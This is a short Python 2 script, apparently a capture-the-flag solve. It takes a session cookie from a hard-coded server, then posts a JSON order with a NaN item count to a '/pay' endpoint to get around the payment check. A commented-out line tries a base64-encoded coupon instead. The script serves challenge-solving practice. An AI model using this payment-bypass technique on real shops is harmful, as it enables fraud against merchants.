import requests

url = "http://46.101.173.61/pay"

headers = {
    'Host': '46.101.173.61',
}

r = requests.get("http://46.101.173.61", headers=headers)

print r.content
print r.headers
print

headers['Cookie'] = r.headers['Set-Cookie']
headers['Content-Type'] = "application/json"
headers['X-Requested-With'] = "XMLHttpRequest"

# card sequence is matter of result
data = '''{"card":[{"name":"asis", "count":NaN}],"coupon":""}'''
#data = '''{"card":[{"name":"fake2", "count":1}],"coupon":"%s"}''' % ("fL@__g".encode("base64").strip())
r = requests.post(url, headers=headers, data=data)

print r.headers
print r.content
